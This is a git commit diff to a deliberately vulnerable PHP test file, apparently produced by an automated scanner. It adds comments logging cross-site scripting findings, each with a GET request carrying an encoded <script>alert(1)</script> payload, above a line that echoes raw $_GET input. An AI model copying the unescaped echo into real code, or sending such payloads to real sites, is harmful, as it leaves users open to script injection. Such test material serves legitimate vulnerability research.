c4a9d8c47f0386155d212d32edc1e77741ba6def
bugisup <bugiz300@yandex.ru>
2015-04-14 10:58:28 +0300

    File update

--- vulnerable.php
+++ vulnerable.php
@@ -29,5 +29,29 @@
 //Host: localhost
 //Accept-Encoding: identity
 //Connection: close
+//TODO: AI XSS issue #195, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/195, 42a6e44e
+//AI exploit:
+//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-fd762bb/vulnerable.php?id5=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//TODO: AI XSS issue #195, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/195, 7177b07a
+//AI exploit:
+//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-fd762bb/vulnerable.php?id4=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//TODO: AI XSS issue #195, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/195, 838a8cdb
+//AI exploit:
+//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-fd762bb/vulnerable.php?id3=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//TODO: AI XSS issue #195, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/195, f282cb8c
+//AI exploit:
+//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-fd762bb/vulnerable.php?id2=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
 echo $_GET['id1']." ".$_GET['id2']." ".$_GET['id3']." ".$_GET['id4']." ".$_GET['id5'];
 ?>
